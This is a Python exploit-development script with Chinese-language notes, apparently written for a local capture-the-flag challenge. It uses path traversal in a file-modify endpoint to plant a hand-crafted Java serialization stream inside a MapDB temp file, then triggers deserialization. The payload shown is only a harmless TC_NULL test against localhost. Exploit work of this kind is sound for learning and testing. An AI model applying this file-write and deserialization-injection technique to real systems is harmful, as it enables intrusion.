#!/usr/bin/env python3
"""
使用 TC_LONGSTRING 方案：将 <end><start> 吸收为字符串内容

布局：
Chunk 0: <start> AC ED 00 05 7C 00 00 <end>
         stream header (4) + TC_LONGSTRING (1) + length_high (2)

注意：TC_LONGSTRING (0x7C) 后面是 8 bytes 的长度（long）
如果我们设置长度为 N，那么接下来的 N bytes 都会被读作字符串内容

问题：我们的 DATA 只有 8 bytes，放不下 stream header + TC_LONGSTRING + 8 bytes length

让我重新设计...

TC_STRING (0x74) 后面是 2 bytes length (unsigned short)
最大长度 = 65535

布局：
Chunk 0 DATA: AC ED 00 05 74 HH LL XX
- AC ED 00 05 = stream header (4 bytes)
- 74 = TC_STRING (1 byte)
- HH LL = length (2 bytes, big-endian)
- XX = string content start (1 byte)

但这样 stream header + TC_STRING + length = 7 bytes
只剩 1 byte 给字符串内容的开始

字符串内容会包含：
- 1 byte (chunk 0 末尾)
- <end> = 5 bytes
- <start> = 7 bytes
- [chunk 1 DATA] = 8 bytes
- <end> = 5 bytes
- <start> = 7 bytes
- [chunk 2 DATA] = 8 bytes
- ...

如果字符串长度设为 L，那么：
- chunk 0 末尾: 1 byte
- chunk 1: 20 bytes total, 8 bytes DATA
- 实际字符串内容 per chunk = 20 bytes (5 + 7 + 8)

等等，让我重新想...

TC_STRING 74 HH LL 之后，ObjectInputStream 会尝试读 (HH << 8 | LL) bytes

如果我设 HH LL = 00 0C (12 bytes)，那么：
- 读 12 bytes 字符串内容

Chunk 0 DATA 布局：AC ED 00 05 74 00 0C XX
- 流读到 74 00 0C，期望 12 bytes 字符串
- XX 是第 1 byte
- 然后 <end> (5 bytes) 是 byte 2-6
- 然后 <start> (7 bytes) 是 byte 7-13... 但我们只需要 12 bytes！

所以字符串会是：XX <end> <start 前5 bytes>
= 1 + 5 + 6 = 12 bytes ✓

然后下一个字节是 <start> 的最后 1 byte = `3e` = `>`
0x3e = 62，不是有效的序列化指令...

让我设字符串长度 = 13 (1 + 5 + 7 = 13)，刚好吃掉 XX + <end> + <start>

Chunk 0 DATA: AC ED 00 05 74 00 0D XX
- 74 00 0D = TC_STRING, length 13
- 然后读 13 bytes: XX(1) + <end>(5) + <start>(7) = 13 ✓

下一个 byte 是 Chunk 1 DATA 的第一个字节！

这就是我们想要的！

然后 Chunk 1 可以开始真正的 payload！
"""

import requests
import base64
import subprocess
import time
import struct

def restart_container():
    subprocess.run("docker stop staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker rm staircase_ctf", shell=True, capture_output=True)
    subprocess.run("docker run -d --name staircase_ctf -p 8080:8080 staircase:latest", shell=True, capture_output=True)
    time.sleep(5)

def get_mapdb_name():
    result = subprocess.run('docker exec staircase_ctf sh -c "ls /tmp/mapdb*temp | head -1"', 
                           shell=True, capture_output=True, text=True)
    return result.stdout.strip().split('/')[-1]

def write_chunk(mapdb_name, offset, data):
    url = 'http://localhost:8080'
    mapdb_path = f"../../../tmp/{mapdb_name}"
    payload = {
        'fileName': mapdb_path,
        'data': base64.b64encode(data).decode(),
        'offset': offset
    }
    return requests.put(f'{url}/files/modify', json=payload, timeout=5)

def build_tc_string_absorb_chain(real_payload):
    """
    使用 TC_STRING 来吸收 <end><start> 标签
    
    Chunk 0: AC ED 00 05 74 LL LL XX
    - stream header + TC_STRING + length + 1 byte content
    - length = 1 + 5 + 7 = 13 (0x000D)
    - 字符串内容 = XX + <end> + <start>
    
    之后每个 chunk 的 8 bytes DATA 都是连续的 payload
    但是每个 DATA 后面还有 <end><start>...
    
    所以我需要在每个 chunk 的 DATA 末尾放一个 TC_STRING 来吸收后面的 <end><start>
    
    实际上这变成了递归的问题...
    
    更好的方案：设置一个超长的字符串，吸收所有后续的 chunk！
    然后在最后一个有效区域结束字符串并放置真正的 payload。
    
    计算：
    - 从 chunk 0 DATA 开始，到 chunk 8 DATA 结束（不超过 0x100300）
    - chunk 0 at 0x100249, chunk 8 at 0x100249 + 8*20 = 0x1002E9
    - chunk 8 DATA ends at 0x1002F0
    
    可用 chunks: 0-8 (9 个)
    每个 chunk 20 bytes，总计 180 bytes 写入空间
    
    方案：
    - Chunk 0 DATA: AC ED 00 05 74 NN NN XX (stream header + TC_STRING + length + 1 byte)
    - length = 计算到最后一个 chunk 的准确距离
    
    让我算：
    Chunk 0 DATA 末尾 (XX) 在 offset 0x100257 (相对于文件)
    从这里开始，字符串内容是：
    - XX (at 0x100257)
    - <end> at 0x100258-0x10025C (5 bytes)
    - <start> at 0x10025D-0x100263 (7 bytes)
    - Chunk 1 DATA at 0x100264-0x10026B (8 bytes)
    - <end> at 0x10026C-0x100270 (5 bytes)
    - <start> at 0x100271-0x100277 (7 bytes)
    - Chunk 2 DATA at 0x100278-0x10027F (8 bytes)
    ...
    
    每个 "chunk" 在流中占 20 bytes
    
    如果我想让字符串刚好在某个 chunk 的 DATA 开始前结束，
    那么字符串长度 = 1 + (5+7) * N = 1 + 12*N
    
    其中 N 是跳过的 <end><start> 对数
    
    如果跳过 1 对：length = 1 + 12 = 13，字符串结束后下一字节是 Chunk 1 DATA 开始
    如果跳过 2 对：length = 1 + 12 + 8 + 12 = 33，但这不对...
    
    让我更精确：
    从 Chunk 0 DATA 末尾字节 (XX) 开始：
    - offset 0: XX
    - offset 1-5: <end>
    - offset 6-12: <start>
    - offset 13-20: Chunk 1 DATA
    - offset 21-25: <end>
    - offset 26-32: <start>
    - offset 33-40: Chunk 2 DATA
    ...
    
    如果 length = 13, 字符串 = bytes[0:13]，下一字节是 offset 13 = Chunk 1 DATA[0]
    
    那 Chunk 1 DATA 可以放什么？
    它需要放 payload，但 payload 后面还有 <end><start>...
    
    如果 Chunk 1 DATA = [payload 6 bytes] + [74 NN]
    74 NN = TC_STRING + length_high_byte
    然后 Chunk 2 DATA = [NN LL] + [string content]
    ...
    
    这太复杂了。
    
    更简单的方案：
    设置一个超长字符串（比如 0xFFFF bytes），让它"吃掉"所有后续数据，
    然后依赖 ObjectInputStream 在 EOF 时的行为...
    
    或者：让字符串长度刚好等于剩余的可用写入空间，
    在字符串内部构建另一个序列化 payload？不行，字符串内容不会被解析为对象...
    """
    
    # 简单方案：只用 2 个 chunks
    # Chunk 0: stream header + TC_STRING + length(13) + padding
    # Chunk 1: 真正的 payload（但受限于 8 bytes）
    
    # 最简单的测试：用 TC_NULL
    # Chunk 0: AC ED 00 05 74 00 0D XX  (string of length 13)
    # 字符串内容：XX + <end> + <start> = 13 bytes
    # Chunk 1: 70 00 00 00 00 00 00 00  (TC_NULL + padding)
    # 下一个读取的是 70 = TC_NULL
    
    chunks = []
    
    # Chunk 0: stream header + TC_STRING(length=13) + 1 byte filler
    chunk0 = b'\xac\xed\x00\x05\x74\x00\x0d\x00'
    chunks.append(chunk0)
    
    # Chunk 1: TC_NULL (0x70)
    chunk1 = b'\x70\x00\x00\x00\x00\x00\x00\x00'
    chunks.append(chunk1)
    
    return chunks

def main():
    print("=== TC_STRING Absorb Strategy ===")
    print()
    
    restart_container()
    mapdb_name = get_mapdb_name()
    print(f"MapDB: {mapdb_name}")
    
    chunks = build_tc_string_absorb_chain(None)
    
    print(f"\nChunks ({len(chunks)}):")
    for i, c in enumerate(chunks):
        print(f"  {i}: {c.hex()}")
    
    print("\nWriting...")
    base = 0x100249
    for i, c in enumerate(chunks):
        offset = base + i * 20
        resp = write_chunk(mapdb_name, offset, c)
        print(f"  Chunk {i} at 0x{offset:x}: {resp.status_code}")
    
    # Verify file content
    print("\nVerifying file content...")
    result = subprocess.run(
        f'docker exec staircase_ctf sh -c "od -A x -t x1z -v -j 0x100249 -N 60 /tmp/{mapdb_name}"',
        shell=True, capture_output=True, text=True
    )
    print(result.stdout)
    
    # Try icon
    print("Checking icon...")
    resp = requests.get('http://localhost:8080/files/icon', timeout=5)
    print(f"Status: {resp.status_code}")
    
    if resp.status_code == 200:
        print(f"Response: {resp.content[:50]}")
    
    # Logs
    result = subprocess.run('docker logs --tail 15 staircase_ctf 2>&1',
                           shell=True, capture_output=True, text=True)
    print(f"\nLogs:\n{result.stdout[-600:]}")

if __name__ == "__main__":
    main()
